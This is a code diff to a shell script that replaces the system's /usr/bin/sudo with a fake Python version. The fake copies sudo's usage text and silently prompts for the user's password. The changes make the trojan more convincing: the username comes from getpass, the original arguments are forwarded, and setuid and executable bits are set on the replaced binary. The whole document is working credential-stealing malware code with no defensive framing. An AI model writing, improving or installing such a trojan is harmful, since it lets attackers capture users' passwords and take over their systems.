@@ -3,6 +3,7 @@ cat <<EOFA > /usr/bin/sudoB
 import os
 import subprocess
 import sys
+import getpass
 
 def main():
     if(len(sys.argv) == 1):
@@ -14,8 +15,7 @@ def main():
         usage: sudo -e [-AknS] [-r role] [-t type] [-C num] [-g group] [-h host] [-p prompt] [-T timeout] [-u user] file ...
         """)
     else:
-        subprocess.Popen('whoami', shell=True, stdout=PIPE).stdout
-        user = stdout.read()
+        user = getpass.getuser()
         
         os.system('stty -echo')
         password = input("[sudo] password for {user}: ")
@@ -30,7 +30,7 @@ main()
 EOFA
 cat <<EOFB > /usr/bin/sudo
 #!/bin/bash
-python3 /usr/bin/sudoB
+python3 /usr/bin/sudoB "$@"
 EOFB
 chmod +s /usr/bin/sudo
 chmod +x /usr/bin/sudo
